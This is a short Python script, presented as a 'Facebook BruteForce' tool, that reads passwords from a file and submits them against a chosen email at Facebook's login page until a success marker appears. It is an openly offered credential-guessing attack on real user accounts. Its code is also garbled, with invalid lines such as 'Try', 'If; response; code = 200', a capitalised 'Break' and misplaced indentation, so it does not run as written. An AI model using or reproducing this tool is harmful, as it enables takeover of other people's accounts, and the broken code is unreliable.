from ast import Break, Try, If
import time
import sys
if sys.version_info[0] !=3: 
	print('''--------------------------------------
	REQUIRED PYTHON 3.x
	use: python3 brute2.py
--------------------------------------
			''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('password.txt','r')

email= input('Enter Email/Username : ')

print ("\nTarget Email ID : ",email)
print ("\nTrying Passwords from list ...")

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 10:
		continue
	print=str(i) +" : ",passw
	response = browser.open(post_url)
Try
If; response; code = 200
browser.select_form(nr=0)()
browser.form['email'] = email
browser.form['pass'] = passw
response = browser.submit()
response_data = response.read()
if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
	print('Your password is : ',passw)
	Break
	
